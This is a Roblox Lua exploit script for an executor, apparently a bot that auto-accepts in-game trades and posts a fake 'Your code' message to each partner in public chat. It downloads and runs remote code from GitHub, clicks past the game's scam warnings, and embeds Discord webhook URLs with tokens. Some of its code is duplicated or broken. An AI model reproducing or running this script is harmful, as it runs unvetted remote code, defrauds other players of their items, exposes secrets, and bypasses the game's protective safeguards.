json = loadstring(game:HttpGet(('https://raw.githubusercontent.com/rxi/json.lua/master/json.lua')))()

local https = game:GetService('HttpService')
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")
local Player = Players.LocalPlayer
local wait = task.wait
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Lighting = ("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")

local Player = Players.LocalPlayer
local wait = task.wait
loadstring(game:HttpGet("https://raw.githubusercontent.com/Maximusikk/itrScri/main/fmg.lua"))()
local Webhook = "https://discord.com/api/webhooks/1041757702960980121/N1TuHBGCcqCjfZQBZgpjT5uzg6qo8i7PAAkm9grxpATpdzfaEOWaXy-FANf36E1zqKYM"
local webhook2 = "https://discord.com/api/webhooks/1069275478545944766/-ZnKO86KllyneMmlBoyFeqg0Mt--etvYYnlhSntVqBU1OH-MSbn7NDu8y-xT6H373Bnn"
local radius = 150
local Xc = 0
local Zc = 0
local angle = 0

local player = game.Players.LocalPlayer
local bad_items = {
    ['rbxassetid://2582282124'] = 'Sandwich',
    ['rbxassetid://7137574255'] = 'Honey candy',
    ['rbxassetid://1043331236'] = 'Watermelon',
    ['rbxassetid://1373237029'] = 'Big head potion'
    
}

_G.accepts = 0
_G.confirms = 0
_G.button = nil
_G.accepted = false


_G.declined = false
_G.first_360 = nil

function button_click (button_obj)
    local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
    
    for i,v in pairs(events) do
        for _,connection in pairs(getconnections(button_obj[v])) do
      pcall(function ()
        connection:Fire()
      end)
        end
    end
end

function decline ()
  pcall(function ()
    decline_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Decline
      button_click(decline_button)
  end)
    
    _G.accepts = 0
end

function cash_out ()
  pcall(function ()
    cash_button = game:GetService("Players")[player.Name].PlayerGui.CheckApp.Frame.Buttons.CashOut
    button_click(cash_button)
  end)
end

car_cframe = game:GetService("Workspace").Interiors["Neighborhood/Fall"].Static.CarStand.MagicalGirlCar.Body.MainBody.CFrame

default_cframe = CFrame.new(car_cframe.x - 47, car_cframe.y + 0, car_cframe.z + 31)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = default_cframe
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 10
angle = 360

local runservice = game:GetService("RunService") -- this is the service for the fps idk it handles all processing


wait(1)


game.RunService.RenderStepped:Connect(function ()
  --if (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z - default_cframe.Z) > 15 then
  --  angle = 0
  --  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = default_cframe
  --  wait(3)
  --end
  if angle == 360 then
    if _G.first_360 == nil then
      _G.first_360 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    end
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = _G.first_360
    angle = 0
  end
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 10
    local x = radius * math.cos(math.rad(angle)) + Xc
    local z = radius * math.sin(math.rad(angle)) + Zc
    game.Players.LocalPlayer.Character.Humanoid:Move(Vector3.new(x,0,z))
  angle = angle + 1
end)

while wait(1) do
  _G.accepted = false
  
  if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == true then
    game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
  end


  if pcall(function()
     abc_button = game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate
  end) then
    _G.confirms = 0
      _G.accepts = 0

    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == true then
      game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
    end

  

    pcall(function()
        if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'This trade seems') then
        button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
      end
    end)

    
    wait(.1)
    

    pcall(function()
        if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Remember:') then
        button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
      end
    end)
    

      for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
          if button.Name == 'ButtonTemplate' then
              if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
          _G.button = button
                  button_click(_G.button)
                break
        end
          end
      end

    
    wait(.1)
    

    pcall(function()
        if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Be careful when trading') then
        button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
      end
    end)

    game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true

    
    wait(.2)
  

    Parthner_Nick = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Header.PartnerLabel.Text

    wait(.1)
  

    local A_1 = " Hello : " .. Parthner_Nick
    local A_2 = "To " .. Parthner_Nick
    local Event = game.TextChatService.TextChannels.RBXGeneral:SendAsync(A_1)

    wait(.5)

    local A_1 = " Your code : #### ####"
    rand = math.floor(math.random(1, 2))
    
    if rand == 1 then
      A_1 = " Your code : #### ####"
    else
      A_1 = " Your code : #### ###"
    end

    local A_2 = "To " .. Parthner_Nick
    local Event = game.TextChatService.TextChannels.RBXGeneral:SendAsync(A_1)
    wait(.5)

    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency == 1 then
      game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true
    end

      while wait(.01) do
      

      _G.aboba = false
      for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
            _G.aboba = true
                  break
          end
            end
        end
      if _G.aboba == true then
        break
      end

      if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency ~= 1 then
        game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true
      end

      if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
        break
      end

          _G.accepts = _G.accepts + 1
  
          if _G.accepts >= 18000 then
              _G.accepts = 0
              decline()
              break
          end
        
local ResultToCofrimed
local TradePassed = true
        function CheckSlots()
            local e = 1
            local a = 1
            local ItsEnd = false
            local CheckAgain = false
            local Checked = 0 
            TradePassed = true
                local ItsAccepted = true
          local MessageMassive = {}
                local MessageMassive2 = {}
                for i, v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
                    if v.Name == 'ItemImageTemplate' then
                        for i, id in pairs(entries) do  
                            if v.Image == id.image then
                                game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true  
                                ItsAccepted = false
                                MessageMassive[a] = id.name
                                a = a + 1
                                TradePassed = false
                                print("asd123sad123")
                                break
                            end                            
                        end
                    end
                end
                if TradePassed == false then
                    local A_1 = "Уберите из трейда | Remove from trade: " .. table.concat(MessageMassive, ", ")
                    local A_2 = "To " .. Parthner_Nick
                    local Event = game.TextChatService.TextChannels.RBXGeneral:SendAsync(A_1)
                end
                if TradePassed == true then 
                for i, v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
                    if v.Name == 'ItemImageTemplate' then
                        for i, id in pairs(entries) do  
                                local sam = v.Image
                                print("99999999999")
                                local stringgg = sam.sub(sam, 14, 25)   -- удалить с 3й позиции 2 символа, т. е. 'бо'
                                MessageMassive2[e] = "https://web.roblox.com/library/" .. stringgg
                                e = e + 1

                                break
                                end
                            end   
                        end 
                    local result2 = table.concat(MessageMassive2, ", ")
                    print(result2)
                    ResultToCofrimed = result2
                    print("yeeeeeee")
                end
            end
  if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency ~= 1 and _G.accepted == false then
        _G.accepted = true
                CheckSlots()
                local UnAccepted = false
                if TradePassed == false then
                    repeat wait(0.2) 
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency == 1 then
                            print("UnAccepted")
                            UnAccepted = true
                        end
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                            UnAccepted = true
                            print("breaked")
                            break
                        end
                    until UnAccepted == true
                        if UnAccepted == true then
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                            print("breaked")
                            break
                        end
                            repeat wait(0.2)
                                if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                                    print("breaked")
                                    break
                                end
                                if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency ~= 1 then
                                    _G.accepted = true
                                    CheckSlots()
                                    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                                        Phase2Reached = true
                                        print("breaked")
                                        break
                                    end
                                    local Phase2Reached = true
                                    break
                                end
                            until Phase2Reached == true
                    end
                end
                
                if TradePassed == true then

        if _G.declined == true then
          _G.declined = false
          break
        end

        if pcall(function ()
          accept_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Accept
        end) then
          wait(.01)
                button_click(accept_button)
          wait(1)
                    ItsAccepted = false
                    CheckAgain = false
        end

      
              while wait(.01) do
          pcall(function()
              if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'This trade seems') then
              button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
            end
          end)

        

          pcall(function()
              if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Remember:') then
              button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
            end
          end)
          

          _G.aboba = false
          for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
                if button.Name == 'ButtonTemplate' then
                    if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
                _G.aboba = true
                      break
              end
                end
            end
          if _G.aboba == true then
            break
          end
          if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
            break
          end

          
        -- Раньше тут были слоты, но из за их реформы скрипт не работал и их пришлось убрать
        --  _G.slots = 0
        --  for i,v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
        --    if v.Name == 'ItemImageTemplate' then
    --          _G.slots = _G.slots + 1
      --      end
      --    end

        --  if _G.slots == 0 then
--break
        --  end

                  _G.confirms = _G.confirms + 1
  
                  if _G.confirms > 18000 then
                      _G.confirms = 0
                      decline()
                      break
                  end

                  if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency ~= 1 then
                      _G.confirms = 0
                      _G.accepts = 0

            if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
              break
            end
            
            if Parthner_Nick == "AinsOulgorn" then
                
                decline()
                break
            end
            if Parthner_Nick == "SOMANYCHARACTERS" then

                            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                            break
            end
                     
                        if Parthner_Nick == OldNick then
        
                            button_click(confirm_button)
                            wait(1)
                            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                        break
                        else
            
            pcall(function ()
              confirm_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.Accept
                      button_click(confirm_button)
                            print(ResultToCofrimed)
                            OldNick = Parthner_Nick
            end)
            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
            

    

                      break
                    end
                      end
                  end
              end
          end
      end
  end

  wait(1)
end
